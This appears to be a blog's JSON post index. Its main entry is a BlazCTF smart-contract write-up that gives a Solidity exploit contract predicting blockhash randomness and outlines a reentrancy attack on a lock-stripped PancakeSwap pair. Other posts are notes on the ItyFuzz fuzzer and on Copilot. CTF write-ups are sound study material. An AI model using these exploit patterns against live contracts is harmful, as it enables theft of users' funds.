[ { "title": "BlazCTF writeup (WIP)", "url": "/posts/blazctf/", "categories": "Security, CTF", "tags": "CTF", "date": "2024-02-23 20:04:32 +0800", "snippet": "blazCTF writeup (post-game replay)I solved only few challenges when the game ended, so this is a replay with the help of existing write-ups.common usageforge create {contract name} --rpc-url {} --p...", "content": "blazCTF writeup (post-game replay)I solved only few challenges when the game ended, so this is a replay with the help of existing write-ups.common usageforge create {contract name} --rpc-url {} --private-key {} --contracts {local path} --constructor-args {}cast send --rpc-url {} --private-key {} \"{fuction signature}\" {arg}hello worldfundamental usage of etherscanrock-paper-scissorHand is predictable because blockhash is an unsafe source of randomness. Since Solver.predictRandomShape() and Challenge.randomShape() are in the same block, the exploit contract could be like:// SPDX-License-Identifier: MITpragma solidity ^0.8.20;import \"./Challenge.sol\";contract Solver { Challenge public challenge; constructor(address challengeAddress) { challenge = Challenge(challengeAddress); } function solve() external returns (bool) { // Predict the randomShape value RockPaperScissors.Hand predictedHand = predictRandomShape(); // Determine the hand that defeats the predicted hand RockPaperScissors.Hand handToWin = determineWinningHand(predictedHand); // Call tryToBeatMe with the predicted hand to set defeated to true challenge.rps().tryToBeatMe(handToWin); return challenge.isSolved(); } function predictRandomShape() internal view returns (RockPaperScissors.Hand) { // Reproduce the same random value as in randomShape function return RockPaperScissors.Hand(uint256(keccak256(abi.encodePacked(address(this), blockhash(block.number - 1)))) % 3); } function determineWinningHand(RockPaperScissors.Hand hand) internal pure returns (RockPaperScissors.Hand) { // Determine the hand that defeats the predicted hand if (hand == RockPaperScissors.Hand.Rock) { return RockPaperScissors.Hand.Paper; } else if (hand == RockPaperScissors.Hand.Paper) { return RockPaperScissors.Hand.Scissors; } else { return RockPaperScissors.Hand.Rock; } }}Easy-NFTOur goal is to make the PLAYER be the owner of the first 20 ET. mint can do that (even the tokenId doesn’t exist or already has owner), and mint requires msg.owner be the PLAYER itself so I just mint 20 times in CLI.lockless-swapIt’s noticable (from the comment) that some kind of lock protection is removed in LocklessPancakePair.swap(). We can find the original PancakePair contract in https://github.com/pancakeswap/pancake-swap-core/blob/master/contracts/PancakePair.sol , and find out modifier lock() was changed and made the swap vulnerable to re-entrancy attack.To achieve this attack, we need to write a IPancakeCallee contract (as the 3rd parameter of swap) and call swap() again in its pancakeCall function.本人不才，官方solution没看懂。Jambo最后唯一成功的方案：部署到sepolia后使用 https://library.dedaub.com/decompile?md5=72c082af175604345ff855b76f19ec62 反编译0x2f484947函数可以转出所有的balance到msg.sender，根据参数类型看应该是answer函数。start只能由初始化者执行？无法由调用者再次执行start？" }, { "title": "Ityfuzz 源码分析", "url": "/posts/ityfuzz_source/", "categories": "Security, Fuzz", "tags": "fuzz", "date": "2024-01-15 16:42:47 +0800", "snippet": ".├── backtesting.md onchain examples├── benches benchmark(unused) ├── cache What's the result??│   ├── 99│   └── heimdall What's heimdall?├── Cargo.lock├── Cargo.toml├── ci.py...", "content": ".├── backtesting.md onchain examples├── benches benchmark(unused) ├── cache What's the result??│   ├── 99│   └── heimdall What's heimdall?├── Cargo.lock├── Cargo.toml├── ci.py 当PR时报告给aws s3和PR comment├── CNAME not used?├── Dockerfile ├── integration-test.md ├── integration_test.py run online/offline tests after build├── ityfuzzup│   ├── install download ityfuzzup and install│   └── ityfuzzup install different versions├── LICENSE MIT license├── Makefile.toml cargo make xxxxx├── onchain_scripts│   ├── debug_file_generator.py │   ├── evaluate.py record slow/solution/crash│   ├── immunefi.py fetch vuln address│   ├── requirements.txt│   └── target.txt├── onchain_tests.txt integration_tests list├── README_CN.md├── README.md├── rustfmt.toml rustfmt config file├── rust-toolchain.toml specify rust version├── server proxy server(5001-&gt;Ganache)│   ├── app.js│   ├── package.json│   └── package-lock.json├── solidity_utils │   └── lib.sol bug print library├── solutions├── src│   ├── cache.rs│   ├── const.rs│   ├── evm│   ├── executor.rs│   ├── feedback.rs│   ├── fuzzer.rs│   ├── fuzzers│   ├── generic_vm│   ├── indexed_corpus.rs│   ├── input.rs│   ├── main.rs 初始化sentry和tracing-subscriber│   ├── minimizer.rs│   ├── move│   ├── mutation_utils.rs│   ├── oracle.rs│   ├── power_sched.rs│   ├── README.md│   ├── scheduler.rs│   ├── state_input.rs│   ├── state.rs│   └── tracer.rs├── target│   ├── CACHEDIR.TAG│   ├── debug│   └── tmp├── tempoutput.txt├── tests│   ├── custom│   ├── evm│   ├── evm_manual│   ├── evm_never_pass│   ├── move│   └── presets├── tree_1├── tree_2├── ui│   ├── backend.py│   ├── requirements.txt│   ├── start.sh│   ├── static│   └── wrapper.py└── work_dir ├── abis.json ├── corpus ├── coverage ├── coverage.json ├── coverage.txt ├── files.json ├── relations.log ├── traces ├── vulnerabilities └── vuln_info.jsonl" }, { "title": "Ityfuzz 试用", "url": "/posts/ityfuzz_trial/", "categories": "Security, Fuzz", "tags": "fuzz", "date": "2024-01-12 20:04:32 +0800", "snippet": "基本使用ityfuzzup # 更新solc xxx.sol --bin --abi -o . --overwrite # 编译ityfuzz evm -t \"concolic-1/build/*\" --concolictestsevmcomplex-condition：没有测试完全部三个函数，其中一个得到结果就输出了？concolic-1：涉及address的我记得论文里提过，需要引入符号...", "content": "基本使用ityfuzzup # 更新solc xxx.sol --bin --abi -o . --overwrite # 编译ityfuzz evm -t \"concolic-1/build/*\" --concolictestsevmcomplex-condition：没有测试完全部三个函数，其中一个得到结果就输出了？concolic-1：涉及address的我记得论文里提过，需要引入符号执行（变成concolic）。但是不知为何加上--concolic --concolic-caller也跑不出来concolic-for：加或不加--concolic在速度上没有区别？换了环境也不行。echidna_flag：不做修改会撞上echidna_revert_always? echidna_sometimesfalse的返回值在哪里看？flashloan：本地部署IERC20后未触发bug()invariant：需要手动把X.address改为x.address【经测试，.address只对子合约sol文件内的名字生效，所以这里需要修改】reentrancy &amp; verilog-2：很完美，自动构造了调用合约并生成了用于重入的fallback()函数？return：？taints-1：没有符号执行不可能做出来evm_manualMove需要自行编译sui_support feature？" }, { "title": "Ityfuzz paper reading", "url": "/posts/ityfuzz_paper/", "categories": "Security, Fuzz", "tags": "fuzz", "date": "2024-01-10 21:47:01 +0800", "snippet": "AI Summary This part is generated by Scispace &amp; ChatGPTSummary and Organized ContentIntroduction and Background Smart contracts pose challenges for fuzzing due to their stateful nature and th...", "content": "AI Summary This part is generated by Scispace &amp; ChatGPTSummary and Organized ContentIntroduction and Background Smart contracts pose challenges for fuzzing due to their stateful nature and the persistent blockchain state. Existing fuzzing tools are limited to local deployment, making on-chain auditing for real-time exploration crucial. ItyFuzz emerges as a solution, being a snapshot-based fuzzer designed specifically for testing smart contracts on-chain.Key Features and Methodology Snapshot-Based Fuzzing: ItyFuzz adopts a snapshot-based approach, allowing for the storage of intermediate states. This reduces re-execution overhead and facilitates efficient state exploration. Waypoint Mechanisms: It employs dataflow and comparison waypoints to categorize and store states effectively, thus enabling the identification of potential vulnerabilities more efficiently.Performance and Results ItyFuzz excels in terms of instructional coverage, outperforming existing fuzzers. This capability empowers ItyFuzz to find and generate realistic exploits for on-chain projects swiftly. The fuzzer’s ability to synthesize reentrancy exploits quickly stands out, highlighting its efficiency and effectiveness.Contributions and Practical Implications The development of ItyFuzz introduces a novel snapshot-based fuzzing algorithm tailored for stateful smart contract testing. Practical implications include the reduction of re-execution overhead, faster synthesis of reentrancy exploits, and the facilitation of on-chain auditing to preemptively identify and prevent exploits in real-world smart contract applications.Literature Context Fuzz testing, a proven technique for identifying vulnerabilities in software, has evolved with coverage-guided fuzzers uncovering bugs in various real-world systems. Despite the challenges posed by smart contracts’ stateful nature, there’s a growing need for advanced fuzzing techniques that can effectively test these contracts.ConclusionBy consolidating the information, we see that ItyFuzz addresses a critical need in the domain of smart contract security. Its snapshot-based approach, complemented by innovative waypoint mechanisms, positions it as a robust tool for on-chain auditing and vulnerability detection.Human NotesFeatureSpeed the state of the blockchain is constantly changing attacker exploits can happen at any timeHow to speed up? refactored existing EVM implementation for fast snapshot feedback (i.e. waypoints) to classify states corpus pruning (语料剪枝？) to reduce states ammountsContributions snapshot-based fuzzing algorithm to reduce re-execution overhead Dataflow waypoint to evaluate(classify) states based on \"future\" memory load (?) Comparison waypoint to compress state corpus by probabilistic sampling and hard comparison feedback. 通过概率采样和硬比较反馈来压缩状态语料库?2 Background 2.1 To fuzz smart contracts, producing a sequence of inputs(transactions) is necessary. 2.2 Waypoints: intermediate inputs that provide interesting.4 Methodology4.1 Architecture execution waypoints save pair (s0,t0) to corpus1 state waypoints save result state s’ to corpus2 (infant state corpus)4.3 Dataflow Waypoint Interesting memory location: appears as the argument of the load instruction in the future. Interesting state: state change contains unique writes to interesting memory locations. Using past load locations to approximate the future intersting load locations. 跟踪过去加载过的memory location以及正在加载的value的abstraction，如果写入的abstraction of value与该地址过去的都不同，则判断该store以及resulting state都是interesting的。 L: abstract memory location map S: abstract store map 4.4 Comparison Waypoint find states that have closer opcodes with the comparison target s.votes+1 when execution minimizes the comparison map votes number encodes the interestingness of a stateTo solve the problem of too many states to select from, and the are likely similar: prioritize the exploration of states with greater votes algorithm switches between random sampling and probabilistic sampling during each epoch (this could avoid being greedy 虽然我没明白，防止收敛到局部最优？)To solve the problem of infant state corpus boom: prune corpus when its size = a threshold sort the states by votes/visits5 ImplementationLibAFL + state corpus + customized feedback for waypointsrevm (rust)’s interpreter hook6 EvalutionCampared with SMARTIAN and two ablations7 Related Work Most fuzzers consider coverage(instructions or control flow edges) feedback. Waypoints: SlowFuzz prioritizes long execution path length PerfFuzz addes multi-dimensinal feedback Comparison feedback FuzzFactory formalizes the concept of waypoints. Stateful Fuzzing: SMARTIAN,Nyx,CorbFuzz Smart Contract related Fuzzer:　ContractFuzzer, Echidna, Harvey, SMARTIAN Symbolic Execution: Mythril, Manticore… " }, { "title": "Copilot Trial", "url": "/posts/copilot/", "categories": "Misc", "tags": "llm", "date": "2024-01-10 21:36:25 +0800", "snippet": "CodespaceGithub Codespace: 感觉更适合合作办公CopilotUsage: Tab / Control+Enter provides auto completion and possible options generates from commentsIt collects: context filename and type of the file be...", "content": "CodespaceGithub Codespace: 感觉更适合合作办公CopilotUsage: Tab / Control+Enter provides auto completion and possible options generates from commentsIt collects: context filename and type of the file being edited information in other open tabs." } ]
